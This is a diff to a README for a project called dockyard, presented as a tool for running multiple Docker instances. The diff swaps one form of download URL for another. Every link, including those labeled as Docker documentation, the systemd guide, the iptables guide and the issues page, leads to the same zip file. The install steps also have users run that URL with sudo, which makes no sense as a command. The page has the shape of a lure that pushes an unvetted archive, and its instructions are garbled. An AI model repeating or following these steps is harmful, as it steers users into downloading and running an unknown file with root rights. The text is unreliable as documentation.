@@ -1,6 +1,6 @@
 # 🚢 dockyard - Run Multiple Docker Instances Safely
 
-[![Download dockyard](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)
+[![Download dockyard](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)
 
 ---
 
@@ -41,14 +41,14 @@ dockyard is meant to be easy for everyday users. We will guide you step-by-step 
 
 ## 📥 Download & Install dockyard
 
-Please [**visit this page to download**](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip) the latest version of dockyard.
+Please [**visit this page to download**](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip) the latest version of dockyard.
 
 Once you visit the page, look for the latest release. Releases come as files you need to download to your computer.
 
 ### Step 1: Download dockyard
 
 - Open your web browser.
-- Go to: [https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)
+- Go to: [https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)
 - Find the latest release (usually at the top of the page).
 - Download the file matching your system. For example, a `.deb` file for Ubuntu or an `.sh` setup script.
 
@@ -61,10 +61,10 @@ If you downloaded a `.deb` file (for Ubuntu/Debian):
 - Run this command:
   
   ```
-  sudo dpkg -i https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
+  sudo dpkg -i https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
   ```
 
-Replace `https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip` with the exact file name you downloaded.
+Replace `https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip` with the exact file name you downloaded.
 
 If you downloaded a shell script `.sh`:
 
@@ -73,8 +73,8 @@ If you downloaded a shell script `.sh`:
 - Run these commands:
 
   ```
-  chmod +x https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
-  sudo https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
+  chmod +x https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
+  sudo https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
   ```
 
 ### Step 3: Verify installation
@@ -131,7 +131,7 @@ This will list running containers inside that instance.
 
 - You do not need to change your existing Docker setup. dockyard works alongside normal Docker.
 - Make sure sysbox-runc is installed, as dockyard depends on it for isolation.
-- You can use [systemd](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip) to automatically start dockyard instances on boot.
+- You can use [systemd](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip) to automatically start dockyard instances on boot.
 - Use the `dockyard help` command to see all available commands anytime.
 - Keep your Docker updated to avoid compatibility issues.
 
@@ -160,20 +160,20 @@ dockyard involves multiple areas:
 
 ## 🔗 Useful Links
 
-- dockyard releases: [https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)
-- Docker documentation: https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
-- sysbox-runc info: https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
-- systemd basics: https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
-- Linux iptables guide: https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
+- dockyard releases: [https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)
+- Docker documentation: https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
+- sysbox-runc info: https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
+- systemd basics: https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
+- Linux iptables guide: https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
 
 ---
 
 ## 🙋 Getting Help
 
-For questions or issues, please use the GitHub issues page in this repository: https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip
+For questions or issues, please use the GitHub issues page in this repository: https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip
 
 You can also ask for advice in Linux or Docker forums.
 
 ---
 
-[![Download dockyard](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)](https://raw.githubusercontent.com/shaghafbrand/dockyard/main/src/Software-1.0.zip)
+[![Download dockyard](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)](https://github.com/shaghafbrand/dockyard/raw/refs/heads/main/src/Software-1.0.zip)
